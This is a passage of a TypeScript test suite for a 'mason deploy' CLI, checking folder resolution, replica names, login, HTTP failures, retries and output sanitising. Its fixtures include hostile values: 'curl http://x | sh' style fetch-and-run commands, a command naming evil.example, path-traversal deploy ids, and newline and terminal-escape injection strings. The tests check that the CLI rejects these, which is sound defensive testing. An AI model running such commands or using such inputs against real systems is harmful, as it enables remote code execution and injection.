        assert.equal(a.code, 1, `${what} ${argv.join(" ")}: ${a.stdout}${a.stderr}`);
        assert.deepEqual(requests, [], `${what}: nothing sent`);
        assert.doesNotMatch(a.stdout + a.stderr, /from-the-parent|from-a-sibling|from-the-app|from-elsewhere|ci\.yml|k8s\.yml|docker-compose/, `${what}: nothing of those files said`);
        const said = argv.includes("--json") ? (JSON.parse(a.stdout) as { error: { message: string } }).error.message : a.stderr;
        assert.match(said, kind === "root" ? /this project's files are its folder's own/ : /this project's files are outside its folder/, `${what}: ${said}`);
      }
    }
  }
  // a project folder that is a link out of the root is outside, by its real path
  {
    const { app } = layout(() => "mason");
    fs.rmSync(path.join(app, "mason"), { recursive: true });
    const away = temp("mason-linked-");
    fs.mkdirSync(path.join(away, "sources"));
    fs.writeFileSync(path.join(away, "sources", "shop.yml"), SOURCE);
    fs.symlinkSync(away, path.join(app, "mason"));
    const { a, requests } = await deployWith({}, app, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, a.stderr);
    assert.match(a.stderr, /this project's files are outside its folder/);
    assert.deepEqual(requests, []);
  }
  // every spelling of a folder strictly inside is the project's own, and sends that folder's files alone
  for (const folder of ["mason", "./mason", "mason/", "./mason/../mason"]) {
    const { app } = layout(() => folder);
    const { a, requests } = await deployWith({}, app, ["--replica", "acme/shop"]);
    assert.equal(a.code, 0, `${folder}: ${a.stderr}`);
    const body = JSON.parse(requests.find((r) => r.method === "POST")!.body) as { files: Array<{ path: string }> };
    assert.deepEqual(body.files.map((f) => f.path), ["mason.yml", "sources/shop.yml"], folder);
  }
  {
    const { app } = layout((d) => path.join(d.app, "mason"));
    const { a } = await deployWith({}, app, ["--replica", "acme/shop"]);
    assert.equal(a.code, 0, `absolute, inside: ${a.stderr}`);
  }
});

test("mason deploy: a project folder that cannot be resolved (a loop, a file as a folder, unreadable, too long) is refused saying why, in the failure shape, never a crash", async () => {
  // each a shape the system refuses to resolve, made in a project of its own; the folder named in config.json
  const shapes: Array<[string, RegExp, (root: string) => string]> = [
    ["a link to itself", /a symbolic link on the way leads back to itself \(a loop\) \(ELOOP\)/, (root) => { fs.symlinkSync("mason", path.join(root, "mason")); return "mason"; }],
    ["a loop of two links", /\(ELOOP\)/, (root) => { fs.symlinkSync("b", path.join(root, "a")); fs.symlinkSync("a", path.join(root, "b")); return "a"; }],
    ["a file as a folder", /a part of the path is a file, not a folder \(ENOTDIR\)/, (root) => { fs.writeFileSync(path.join(root, "docker-compose.yml"), "x: 1\n"); return "docker-compose.yml/mason"; }],
    ["a path too long", /the path is longer than this system takes \(ENAMETOOLONG\)/, () => Array.from({ length: 15 }, () => "x".repeat(300)).join("/")],
  ];
  // as root, a folder no user may read is read anyway: the unreadable shape is held where it can be made
  if (process.getuid?.() !== 0) {
    shapes.push(["a folder this user may not read", /may not be read by this user \(EACCES\)/, (root) => { fs.mkdirSync(path.join(root, "locked", "mason"), { recursive: true }); fs.chmodSync(path.join(root, "locked"), 0); return "locked/mason"; }]);
  }
  for (const [what, why, make] of shapes) {
    const root = temp("mason-unresolved-");
    fs.mkdirSync(path.join(root, ".mason"));
    const folder = make(root);
    fs.writeFileSync(path.join(root, ".mason", "config.json"), JSON.stringify({ name: "shop", folder, remote: false, apiKey: "k".repeat(48) }), { mode: 0o600 });
    for (const argv of [["--replica", "acme/shop"], ["--replica", "acme/shop", "--dry-run"], ["--replica", "acme/shop", "--json"]]) {
      const { a, requests } = await deployWith({}, root, argv);
      assert.equal(a.code, 1, `${what} ${argv.join(" ")}: ${a.stdout}${a.stderr}`);
      assert.deepEqual(requests, [], `${what}: nothing sent`);
      assert.doesNotMatch(a.stdout + a.stderr, /a bug in mason|\n\s+at /, `${what}: no crash`);
      if (argv.includes("--json")) {
        const e = (JSON.parse(a.stdout) as { error: { code: string; message: string; why: string; fix: string } }).error;
        assert.equal(e.code, "refused", what);
        assert.match(e.message, /^this project's files cannot be found: \.mason\/config\.json names "folder": ".*", which cannot be resolved$/, what);
        assert.match(e.why, why, what);
        assert.match(e.fix, /^set "folder" in \.mason\/config\.json to the project's folder, a folder of its own inside /, what);
      } else {
        assert.match(a.stderr, /^✗ mason deploy: this project's files cannot be found: \.mason\/config\.json names "folder": /m, what);
        assert.match(a.stderr, why, what);
      }
    }
    if (process.getuid?.() !== 0 && fs.existsSync(path.join(root, "locked"))) fs.chmodSync(path.join(root, "locked"), 0o700);
  }
  // the words, whoever runs this (an unreadable folder cannot be made as root)
  // (read by name, so the file loads at a commit without it, and this test fails there by its name)
  const unresolvedWhy = (await import("../src/cli/project.ts") as Record<string, unknown>).unresolvedWhy as ((e: unknown) => string) | undefined;
  assert.equal(unresolvedWhy?.(Object.assign(new Error("x"), { code: "EACCES" })), "a folder on the way may not be read by this user (EACCES)");
});

test("mason deploy: the replica is --replica, else MASON_REPLICA, each part held to its grammar; neither names both ways", async () => {
  const { root } = project();
  let r = await deployWith({}, root, []);
  assert.equal(r.a.code, 2);
  assert.match(r.a.stderr, /^✗ mason deploy: no replica named\n {2}why {3}a deploy goes to one replica of the service\n {2}fix {3}name it: mason deploy --replica <org>\/<name>, or set MASON_REPLICA=<org>\/<name>\n\nNext:\n {2}mason deploy --help {2,}its usage, with every option\n\nusage: mason deploy/);
  assert.deepEqual(r.requests, []);
  for (const bad of ["acme", "Acme/shop", "acme/shop/x", "-acme/shop", "acme/", "../x/shop", `acme/${"a".repeat(64)}`]) {
    r = await deployWith({}, root, [`--replica=${bad}`, "--json"]);
    assert.equal(r.a.code, 2, bad);
    const e = (JSON.parse(r.a.stdout) as { error: { code: string; message: string } }).error;
    assert.equal(e.code, "usage", bad);
    assert.equal(e.message, `--replica ${JSON.stringify(bad)} is not <org>/<name>`);
    assert.deepEqual(r.requests, [], bad);
  }
  r = await deployWith({}, root, ["--json"], { MASON_REPLICA: "acme/Shop" });
  assert.equal(r.a.code, 1);
  assert.equal((JSON.parse(r.a.stdout) as { error: { code: string; message: string } }).error.message, 'MASON_REPLICA "acme/Shop" is not <org>/<name>');
  // MASON_REPLICA when no flag, said on stderr (an agent may never read the environment it inherits); the flag before it
  r = await deployWith({}, root, [], { MASON_REPLICA: "acme/shop" });
  assert.equal(r.a.code, 0, r.a.stderr);
  assert.match(r.a.stderr, /^using MASON_REPLICA=acme\/shop \(--replica names another; unset MASON_REPLICA for none\)$/m);
  r = await deployWith({}, root, ["--replica", "acme/shop"], { MASON_REPLICA: "other/one" });
  assert.equal(r.a.code, 0, r.a.stderr);
  assert.doesNotMatch(r.a.stderr, /using MASON_REPLICA/);
  assert.ok(r.requests.every((q) => q.path.startsWith("/v1/replicas/acme/shop/")));
});

test("mason deploy: with no MASON_TOKEN and no login it says mason login and sends nothing; a saved login is used", async () => {
  const { root } = project();
  const fake = await fakeService({});
  try {
    const h = temp("mason-home-");
    let a = await mason(root, ["deploy", "--replica", "acme/shop"], envFor(h, fake.url));
    assert.equal(a.code, 1);
    assert.equal(a.stderr, `✗ mason deploy: this machine is not signed in to ${fake.url}\n` +
      "  why   a deploy is sent as a person signed in (mason login), or with a token in MASON_TOKEN (CI)\n" +
      "  fix   run mason login, then mason deploy again; in CI, set MASON_TOKEN to a CI token\n\n" +
      `Next:\n  mason login                                   sign this machine in to ${fake.url}\n`);
    assert.equal(fake.requests.length, 0);
    // a login saved for this service (mason login's file)
    const token = newToken(); SECRETS.push(token);
    const dir = path.join(h, ".config", "mason");
    fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    fs.chmodSync(dir, 0o700);
    fs.writeFileSync(path.join(dir, "credentials.json"), JSON.stringify({ version: 1, logins: { [fake.url]: { token, email: "ada@example.com", savedAt: CREATED } } }), { mode: 0o600 });
    a = await mason(root, ["deploy", "--replica", "acme/shop"], envFor(h, fake.url));
    assert.equal(a.code, 0, a.stderr);
    assert.ok(fake.requests.length >= 2);
    assert.ok(fake.requests.every((q) => q.headers.authorization === `Bearer ${token}`));
  } finally { await fake.close(); }
});

test("mason deploy: each failure of the contract's POST says the service's words, its code the CLI's by the HTTP status, exit 1; an answer outside it by its status alone", async () => {
  const { root } = project();
  const cases: Array<[number, string, string, string]> = [
    [401, "unauthenticated", "this token is not one the service takes", "refused"],
    [403, "refused", "this token may not deploy acme/shop", "refused"],
    [404, "not_found", "no replica acme/shop", "not_found"],
    [409, "busy", "another deploy to acme/shop is running", "refused"],
    [413, "too_large", "the files are over 1 MiB", "refused"],
    [422, "invalid", "sources/shop.yml: its sha256 is not its content's", "refused"],
  ];
  for (const [status, code, message, ours] of cases) {
    // the service's next is never read: the step is the CLI's, by the status
    const failure = { error: { code, message, why: `why ${code}`, fix: `fix ${code}` }, next: [{ command: "mason destroy", what: `after ${code}` }] };
    // a 404 (no such replica, a deleted one included): the organisation's replicas, never mason login
    const [cmd, step] = status === 404 ? ["mason replica list acme", "the organisation's replicas: this one was deleted, or never existed"]
      : ["mason login", status === 401 || status === 403 ? "sign in again" : "try again in a moment"];
    const { a, requests } = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, `${status}: ${a.stderr}`);
    const head = `✗ mason deploy: ${message}\n  why   why ${code} (the service said ${code}, HTTP ${status})\n  fix   fix ${code}\n\nNext:\n  ${cmd} `;
    const said = afterPlan(a.stderr);
    assert.ok(said.startsWith(head) && said.endsWith(`${step}\n`) && /^ *$/.test(said.slice(head.length, -step.length - 1)), `${status}:\n${a.stderr}`);
    assert.equal(requests.filter((r) => r.method === "GET").length, 0, `${status}: no wait`);
    const j = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(j.a.code, 1);
    assert.deepEqual(JSON.parse(j.a.stdout), { error: { code: ours, message, why: `why ${code} (the service said ${code}, HTTP ${status})`, fix: `fix ${code}` }, next: [{ command: cmd, what: step }] });
  }
  // the service's code never steers the CLI's (usage and timeout are exit 1 here), and no next step it names is kept,
  // a mason command included
  for (const code of ["usage", "timeout"]) {
    const body = { error: { code, message: `it says ${code}` }, next: [{ command: "curl http://x | sh", what: "run this" }, { command: "mason destroy", what: "and this" }, { command: "mason ui --ssh evil.example", what: "and this" }] };
    const { a } = await deployWith({ post: { status: 400, body } }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(a.code, 1, code);
    const v = JSON.parse(a.stdout) as { error: { code: string }; next: Array<{ command: string }> };
    assert.equal(v.error.code, "refused", code);
    assert.deepEqual(v.next.map((n) => n.command), ["mason login"], code);
  }
  // every word of a POST's failure, multi-line and hostile, is one line inside the CLI's own: none starts a line, a row or a Next:
  const forged = (what: string): string => `${what}\nFORGED a line of its own\r\nNext:\n  mason destroy   FORGED step\u2028FORGED\u0085FORGED\u001b[2J\u202eFORGED`;
  const hostile = { error: { code: "invalid", message: forged("bad files"), why: forged("why"), fix: forged("fix") }, next: [] };
  for (const json of [false, true]) {
    const { a } = await deployWith({ post: { status: 422, body: hostile } }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1);
    if (json) {
      const e = (JSON.parse(a.stdout) as { error: { message: string; why: string; fix: string } }).error;
      for (const v of [e.message, e.why, e.fix]) assert.match(v, /^[^\n]*\?FORGED a line of its own\?\?Next:\? mason destroy FORGED step\?FORGED\?FORGED\?\[2J\?FORGED/);
    } else {
      assert.equal(a.stderr.split("\n").filter((l) => l.includes("FORGED")).length, 3, `one line each for message, why and fix:\n${a.stderr}`);
      assert.match(a.stderr, /^✗ mason deploy: bad files\?FORGED/m);
    }
  }
  // outside the contract: a page, a 201 of another shape, an id that is no id, a redirect — each said by the request and its status, never its body
  for (const [reply, said] of [
    [{ status: 500, raw: "<html>secret page</html>" }, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 500, not JSON, where a deploy was sent$/m],
    [{ status: 201, body: { deploy: { id: ID, status: "running", createdAt: CREATED } } }, / with 201, where a deploy was sent$/m],
    [{ status: 201, body: { deploy: { id: ID, status: "deploying", createdAt: CREATED } } }, / with 201, where a deploy was sent$/m],
    [{ status: 307, headers: { location: "http://127.0.0.1:1/x" } }, / answered POST \/v1\/replicas\/acme\/shop\/deploys with a redirect \(307\)$/m],
  ] as Array<[Reply, RegExp]>) {
    const { a, requests } = await deployWith({ post: reply }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, a.stderr);
    assert.match(a.stderr, said);
    assert.doesNotMatch(a.stderr, /secret page/);
    assert.equal(requests.length, 1, "nothing followed, nothing polled");
  }
  // an id the next request would put in its path: anything but [A-Za-z0-9_-]{1,64} is refused before any request is made of it
  for (const id of ["../../etc", "x/../../v1/me", "//evil.example/x", "a?b=1", "a#b", "%2e%2e", "a b", "", "x".repeat(65)]) {
    const { a, requests } = await deployWith({ post: { status: 201, body: { deploy: { id, status: "queued", createdAt: CREATED } } } }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, JSON.stringify(id));
    assert.match(a.stderr, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 201, where a deploy was sent$/m, JSON.stringify(id));
    assert.deepEqual(requests.map((r) => `${r.method} ${r.path}`), ["POST /v1/replicas/acme/shop/deploys"], `${JSON.stringify(id)}: no request steered by it`);
  }
});

test("mason deploy: the phases are said as they change, in the CLI's words, then the outcome; a 503 or no answer midway is a wait, never an outcome", async () => {
  const { root } = project();
  const steps = [at("queued"), at("applying", { phase: "checking" }), at("applying", { phase: "checking" }), at("starting"),
    { status: 503, raw: "busy" } as Reply, "drop" as Reply, at("starting", { phase: "syncing" }), at("running")];
  const { a, requests } = await deployWith({ get: (n) => steps[Math.min(n, steps.length - 1)]! }, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 0, a.stderr);
  assert.equal(requests.filter((r) => r.method === "GET").length, 8);
  const lines = afterPlan(a.stderr).trimEnd().split("\n");
  assert.equal(lines[0], `Sent 3 files (${lines[0]!.match(/\((\d+) bytes\)/)![1]} bytes) to acme/shop on ${a.stderr.match(/on (http:\/\/127\.0\.0\.1:\d+)/)![1]}: deploy dep_01abc`);
  assert.deepEqual(lines.slice(1, 4), [
    "  Queued: waiting for its turn on the replica",
    "  Applying: Mason on the replica checks and takes the files (Mason on the replica checks the files)",
    "  Starting: Mason on the replica starts on the new files",
  ]);
  assert.match(lines[4]!, /^ {2}Starting: Mason on the replica starts on the new files; the service could not say more just now \(GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc answered 503\): asking again$/);
  assert.match(lines[5]!, /^ {2}Starting: .*; the service could not say more just now \(could not reach http:\/\/127\.0\.0\.1:\d+ .*\): asking again$/);
  assert.equal(lines[6], "  Starting: Mason on the replica starts on the new files (the tables the files add have their first sync)");
  assert.equal(lines[7], "  Running: the replica runs the new files");
  assert.equal(lines.length, 8);
});

/** A POST's 503 or 429, the replica's state beside its failure when given, and its Retry-After when given (`null`: none). */
const waitPlease = (status: 503 | 429, state: string | null, retryAfter: string | null = "1"): Reply => ({ status,
  body: { error: { code: status === 429 ? "too_many" : "not_ready", message: "FORGED wait\nNext:\n  mason destroy" }, ...(state === null ? {} : { replica: { state } }) },
  ...(retryAfter === null ? {} : { headers: { "retry-after": retryAfter } }) });
const posts = (requests: Req[]): Req[] => requests.filter((r) => r.method === "POST");

test("mason deploy: a POST answered 503 (the replica checked, created, its machine not connected) or 429 made no deploy — it is sent again, the same, after its Retry-After, the replica's state and the time waited said; then the deploy goes on", async () => {
  const { root } = project();
  const seq = [waitPlease(503, "checking"), waitPlease(503, "creating"), waitPlease(503, "ready"), queued];
  const { a, requests } = await deployWith({ post: (n) => seq[Math.min(n, seq.length - 1)]! }, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 0, a.stderr);
  const sent = posts(requests);
  assert.equal(sent.length, 4);
  assert.ok(sent.every((p) => p.body === sent[0]!.body && p.headers.authorization === sent[0]!.headers.authorization), "the same deploy each time");
  for (let i = 1; i < sent.length; i++) assert.ok(sent[i]!.at - sent[i - 1]!.at >= 900, `the Retry-After of 1 s was kept: ${sent[i]!.at - sent[i - 1]!.at} ms`);
  const lines = afterPlan(a.stderr).trimEnd().split("\n");
  assert.match(lines[0]!, /^ {2}Waiting to send the deploy: acme\/shop is being checked \(Mason checks its database\) \(HTTP 503\); waited \d+ s$/);
  assert.match(lines[1]!, /^ {2}Waiting to send the deploy: acme\/shop is being created \(HTTP 503\); waited [1-9]\d* s$/);
  assert.match(lines[2]!, /^ {2}Waiting to send the deploy: acme\/shop is ready, and the machine it runs on is not connected just now \(HTTP 503\); waited [1-9]\d* s$/);
  assert.match(lines[3]!, /^Sent 3 files /);
  assert.doesNotMatch(a.stderr, /FORGED/, "nothing of a wait's body but the replica's state is printed");
  assert.match(a.stdout, /^Deployed to acme\/shop: the replica runs it\n/);

  // a 429 (too many deploys at once), and a 503 with no state (not JSON at all): the same, in their own words
  for (const [first, said] of [[waitPlease(429, null), "too many deploys are being sent at once (HTTP 429)"],
    [{ status: 503, raw: "<html>busy</html>", headers: { "retry-after": "1" } } as Reply, "the service cannot take a deploy just now (HTTP 503)"],
    [waitPlease(503, "deleted"), "the service cannot take a deploy just now (HTTP 503)"]] as Array<[Reply, string]>) {
    const r = await deployWith({ post: (n) => n === 0 ? first : queued }, root, ["--replica", "acme/shop"]);
    assert.equal(r.a.code, 0, r.a.stderr);
    assert.equal(posts(r.requests).length, 2, said);
    assert.ok(afterPlan(r.a.stderr).startsWith(`  Waiting to send the deploy: ${said}; waited `), r.a.stderr);
  }

  // --json: nothing but the answer on stdout, nothing of the wait on stderr either
  const j = await deployWith({ post: (n) => n < 2 ? waitPlease(n === 0 ? 503 : 429, "creating") : queued }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(j.a.code, 0, j.a.stderr);
  assert.equal(j.a.stderr, "");
  // stdout is one JSON document, whole (JSON.parse reads nothing beside it)
  assert.equal((JSON.parse(j.a.stdout) as { deploy: { id: string; status: string } }).deploy.status, "running");

  // on a terminal: the wait is a step that turns, then ends, every line the CLI's
  const t = await deployWith({ post: (n) => n === 0 ? waitPlease(503, "creating") : queued }, root, ["--replica", "acme/shop"], {}, { terminal: 60 });
  assert.equal(t.a.code, 0, t.a.stderr);
  assert.match(t.a.stderr, /✔ Waiting to send the deploy: acme\/shop is being created/);
});

test("mason deploy: a POST answered 503 until --timeout runs out is a timeout (exit 124), naming the replica's state and that no deploy was made — a Retry-After longer than what is left is cut to it", async () => {
  const { root } = project();
  const { a, requests } = await deployWith({ post: () => waitPlease(503, "creating") }, root, ["--replica", "acme/shop", "--timeout", "3s"]);
  assert.equal(a.code, 124, a.stderr);
  assert.ok(posts(requests).length >= 2 && posts(requests).length <= 4, `sent again each second, within 3 s: ${posts(requests).length}`);
  assert.equal(requests.filter((r) => r.method === "GET").length, 0, "no deploy to ask about");
  assert.match(a.stderr, /✗ mason deploy: the deploy to acme\/shop was not sent within 3s\n {2}why {3}the service asked to wait: acme\/shop is being created \(HTTP 503\); no deploy was made\n {2}fix {3}mason deploy again once acme\/shop is ready \(mason replica status acme\/shop says its state\); a longer wait is --timeout 30m\n\nNext:\n {2}mason replica status acme\/shop +the replica's state\n {2}mason deploy --replica acme\/shop +deploy again\n$/);
  const t0 = Date.now();
  const j = await deployWith({ post: () => waitPlease(429, null, "3600") }, root, ["--replica", "acme/shop", "--timeout", "2", "--json"]);
  assert.ok(Date.now() - t0 < 30_000, "an hour's Retry-After is cut to what is left of --timeout");
  assert.equal(j.a.code, 124, j.a.stdout);
  assert.equal(posts(j.requests).length, 1);
  const v = JSON.parse(j.a.stdout) as { error: { code: string; why: string }; next: Array<{ command: string }> };
  assert.equal(v.error.code, "timeout");
  assert.match(v.error.why, /too many deploys are being sent at once \(HTTP 429\); no deploy was made/);
  assert.deepEqual(v.next.map((n) => n.command), ["mason replica status acme/shop", "mason deploy --replica acme/shop"]);
  // a terminal's spinner ends on the failure, every line the CLI's
  const t = await deployWith({ post: () => waitPlease(503, "checking") }, root, ["--replica", "acme/shop", "--timeout", "1s"], {}, { terminal: 50 });
  assert.equal(t.a.code, 124, t.a.stderr);
});

test("mason deploy: a 503 or 429 with no Retry-After, or one the CLI does not read (a date, a word, 0, past an hour), waits the short default before sending again", async () => {
  const { root } = project();
  for (const ra of [null, "soon", "Wed, 21 Oct 2026 07:28:00 GMT", "0", "99999"]) {
    const { a, requests } = await deployWith({ post: (n) => n === 0 ? waitPlease(503, "creating", ra) : queued }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 0, a.stderr);
    const sent = posts(requests);
    assert.equal(sent.length, 2, String(ra));
    const gap = sent[1]!.at - sent[0]!.at;
    assert.ok(gap >= 4_500 && gap < 15_000, `${String(ra)}: the default of 5 s, not ${gap} ms`);
  }
});

test("mason deploy: a 409 naming a replica that failed or is being deleted is refused, never sent again — its next step the replica's status, never mason login; deleted is no 409 state (its name is freed: a 404)", async () => {
  const { root } = project();
  const words: Record<string, string> = { failed: "acme/shop failed: its creation did not finish", deleting: "acme/shop is being deleted" };
  for (const [state, said] of Object.entries(words)) {
    const reply: Reply = { status: 409, body: { error: { code: "not_ready", message: "acme/shop cannot take a deploy", why: `it is ${state}` }, replica: { state }, next: [{ command: "mason destroy" }] } };
    const { a, requests } = await deployWith({ post: reply }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, a.stderr);
    assert.equal(requests.length, 1, `${state}: one POST, nothing else`);
    assert.match(afterPlan(a.stderr), new RegExp(`^✗ mason deploy: acme/shop cannot take a deploy\\n {2}why {3}${said}; it is ${state} \\(the service said not_ready, HTTP 409\\)\\n {2}fix {3}a replica takes a deploy only once it is ready: mason replica status acme/shop says its state\\n\\nNext:\\n {2}mason replica status acme/shop +the replica's state\\n$`), state);
    const j = await deployWith({ post: reply }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(j.a.code, 1);
    assert.deepEqual(JSON.parse(j.a.stdout), { error: { code: "refused", message: "acme/shop cannot take a deploy", why: `${said}; it is ${state} (the service said not_ready, HTTP 409)`,
      fix: "a replica takes a deploy only once it is ready: mason replica status acme/shop says its state" }, next: [{ command: "mason replica status acme/shop", what: "the replica's state" }] });
  }
  // a deleted replica's name is freed: the service answers 404, said as any not_found, never sent again; and a 409 that
  // says "deleted" is no state the CLI names (it is said as any 409, the state not put in its words)
  const gone = await deployWith({ post: { status: 404, body: { error: { code: "not_found", message: "no replica acme/shop" } } } }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(gone.a.code, 1);
  assert.equal(posts(gone.requests).length, 1);
  const g = JSON.parse(gone.a.stdout) as { error: { code: string }; next: Array<{ command: string; what: string }> };
  assert.equal(g.error.code, "not_found");
  assert.deepEqual(g.next, [{ command: "mason replica list acme", what: "the organisation's replicas: this one was deleted, or never existed" }]);
  const goneText = await deployWith({ post: { status: 404, body: { error: { code: "not_found", message: "no replica acme/shop" } } } }, root, ["--replica", "acme/shop"]);
  assert.match(goneText.a.stderr, /\n\nNext:\n {2}mason replica list acme +the organisation's replicas: this one was deleted, or never existed\n$/);
  const deleted = await deployWith({ post: { status: 409, body: { error: { code: "not_ready", message: "acme/shop cannot take a deploy" }, replica: { state: "deleted" } } } }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(deleted.a.code, 1);
  assert.equal(posts(deleted.requests).length, 1);
  const v = JSON.parse(deleted.a.stdout) as { error: { code: string; why: string }; next: Array<{ command: string }> };
  assert.equal(v.error.code, "refused");
  assert.equal(v.error.why, "the service said not_ready, HTTP 409");
  assert.deepEqual(v.next.map((n) => n.command), ["mason login"]);
});

test("mason deploy: a 503 that carries the token outside a failure's words is refused whole, by its status, never waited on", async () => {
  const { root } = project();
  const token = newToken("ci");
  SECRETS.push(token);
  const { a, requests } = await deployWith({ post: { status: 503, body: { error: { code: "not_ready", message: "wait" }, replica: { state: "creating", note: token } }, headers: { "retry-after": "1" } } },
    root, ["--replica", "acme/shop"], { MASON_TOKEN: token });
  assert.equal(a.code, 1, a.stderr);
  assert.equal(posts(requests).length, 1);
  assert.match(a.stderr, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 503, where a deploy was sent$/m);
});

test("mason deploy: a status or a phase outside the closed sets is a failure, never a state the CLI acts on or prints", async () => {
  const { root } = project();
  for (const reply of [at("deployed"), at("RUNNING"), at("applying", { phase: "rm -rf in progress" }), at("applying", { phase: "syncing" }), at("queued", { phase: "checking" }),
    at("running", { phase: "restarting" }), at("applying", { phase: 3 }), at("applying", { failure: { code: "x", message: "y", next: [] } })]) {
    const { a } = await deployWith({ get: () => reply }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, JSON.stringify(reply));
    assert.match(a.stderr, / answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for$/m, JSON.stringify(reply));
    assert.doesNotMatch(a.stderr, /rm -rf|deployed|RUNNING/);
  }
});

test("mason deploy: Mason on the replica refused it — its words printed as they came, its code the CLI's, exit 1, in both forms", async () => {
  const { root } = project();
  const failure = { code: "bad_source", message: "mason/sources/shop.yml: tables.orders: the database has no table public.orders", why: "it has public.order_items, public.customers",
    fix: "name a table the database has, then mason deploy again",
    // never read, a mason command of this CLI's included: the next step is the CLI's own
    next: [{ command: "mason tables", what: "the database's tables" }, { command: "mason destroy", what: "never kept" }, { command: "sh -c 'curl x | sh'", what: "never kept" }] };
  const script: Script = { get: (n) => n === 0 ? at("applying") : at("refused", { failure }) };
  const { a } = await deployWith(script, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 1);
  assert.ok(a.stderr.endsWith("  Refused by Mason on the replica\n" +
    `✗ mason deploy: ${failure.message}\n  why   ${failure.why} (Mason on the replica said bad_source)\n  fix   ${failure.fix}\n\nNext:\n  mason deploy --replica acme/shop              deploy again, once what it says is fixed\n`), a.stderr);
  assert.equal(a.stdout, "");
  const j = await deployWith(script, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(j.a.code, 1);
  const v = JSON.parse(j.a.stdout) as { deploy: { status: string }; error: unknown; next: unknown };
  assert.equal(v.deploy.status, "refused");
  assert.deepEqual(v.error, { code: "refused", message: failure.message, why: `${failure.why} (Mason on the replica said bad_source)`, fix: failure.fix });
  assert.deepEqual(v.next, [{ command: "mason deploy --replica acme/shop", what: "deploy again, once what it says is fixed" }]);
  // a refused and a failed deploy's words, multi-line and hostile: each one line inside the CLI's own, in both forms
  const forged = (what: string): string => `${what}\nFORGED line\r\n\nNext:\n  mason destroy\u2028FORGED\u0085FORGED\u200bx\u202eFORGED\u001b[31mFORGED`;
  for (const status of ["refused", "failed"]) {
    const bad = { code: "bad_source", message: forged("message"), why: forged("why"), fix: forged("fix"), next: [{ command: "mason destroy" }] };
    for (const json of [false, true]) {
      const r = await deployWith({ get: () => at(status, { failure: bad }) }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
      assert.equal(r.a.code, 1, `${status} ${json}`);
      if (json) {
        const e = (JSON.parse(r.a.stdout) as { error: { code: string; message: string; why: string; fix: string } }).error;
        assert.equal(e.code, status);
        assert.equal(e.message, "message?FORGED line???Next:? mason destroy?FORGED?FORGED?x?FORGED?[31mFORGED");
      } else {
        assert.equal(r.a.stderr.split("\n").filter((l) => l.includes("FORGED")).length, 3, `${status}: one line each for message, why and fix:\n${r.a.stderr}`);
        assert.doesNotMatch(r.a.stderr, /\u001b\[31m|\u202e|\u200b/);
      }
    }
  }
  // the service's code never sets the exit: a failed deploy that says timeout or usage is code failed, exit 1
  for (const code of ["timeout", "usage"]) {
    const t = await deployWith({ get: () => at("failed", { failure: { code, message: "the machine did not start", next: [] } }) }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(t.a.code, 1, code);
    assert.deepEqual((JSON.parse(t.a.stdout) as { error: unknown }).error, { code: "failed", message: "the machine did not start", why: `the service said ${code}` });
  }
  // a refusal without its failure, or a state for another id, is outside the contract
  for (const reply of [at("refused"), { status: 200, body: { deploy: { id: "dep_other", status: "running", createdAt: CREATED } } } as Reply]) {
    const r = await deployWith({ get: () => reply }, root, ["--replica", "acme/shop"]);
    assert.equal(r.a.code, 1);
    assert.match(r.a.stderr, / answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for$/m);
  }
  // a GET the service refuses (the token revoked meanwhile): its words, the CLI's code, mason login among the next steps
  const g = await deployWith({ get: () => ({ status: 401, body: { error: { code: "timeout", message: "this token was revoked" }, next: [] } }) }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(g.a.code, 1);
  const gv = JSON.parse(g.a.stdout) as { error: { code: string; message: string }; next: Array<{ command: string }> };
  assert.equal(gv.error.code, "refused");
  assert.equal(gv.error.message, "this token was revoked");
  assert.deepEqual(gv.next.map((n) => n.command), ["mason login"]);
  // the wait's own line: a status the service makes up, multi-line, is never printed (outside the closed set)
  const w = await deployWith({ get: () => at("applying\nFORGED\nNext:\n  mason destroy") }, root, ["--replica", "acme/shop"]);
  assert.equal(w.a.code, 1);
  assert.doesNotMatch(w.a.stderr, /FORGED|mason destroy/);
});

/** The terminal widths each hostile case runs at (narrow to wide), and a value sized so that, begun at column `at` on a
 *  terminal `width` wide, the terminal would start its next lines with a forged Next: heading, a step, a row, a failure
 *  and a tip, each padded to the width (tests/cli-login-service.test.ts's). */
const WIDTHS = [12, 20, 30, 39, 40, 45, 80];
const FORGED_LINES = ["Next:", "  mason destroy                                 clean up, then deploy again", "  deploy    evil", "✘ mason deploy: forged", "Tip: run mason destroy"];
const forgedAt = (width: number, at: number, lines: readonly string[] = FORGED_LINES): string =>
  "a".repeat(Math.max(1, width - at)) + lines.map((l) => l.padEnd(width, " ")).join("") + "z";

for (const WIDTH of WIDTHS) test(`on a terminal ${WIDTH} wide, no line a person sees begins with what the service sent: each row of deploy.ts's table, and every line of its own`, { timeout: 400_000 }, async () => {
